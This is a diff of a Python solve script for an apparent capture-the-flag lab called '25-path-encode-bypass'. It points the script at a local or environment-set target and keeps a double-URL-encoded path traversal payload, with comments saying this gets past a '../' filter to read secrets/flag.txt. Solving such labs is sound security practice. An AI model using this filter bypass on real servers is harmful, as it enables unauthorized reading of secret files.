@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 """
 25-path-encode-bypass
@@ -14,7 +15,7 @@ from urllib.parse import urljoin
 import requests
 
 
-BASE_URL = "http://47.120.76.57:34310/"
+BASE_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:34310/")
 # /var/www/public/ -> /var/ 需要退两级，然后进 secrets/flag.txt
 # ../ 被过滤，所以把 / 双重编码为 %252f，服务端二次解码后变成 /
 PAYLOAD = "..%252f..%252fsecrets%252fflag.txt"
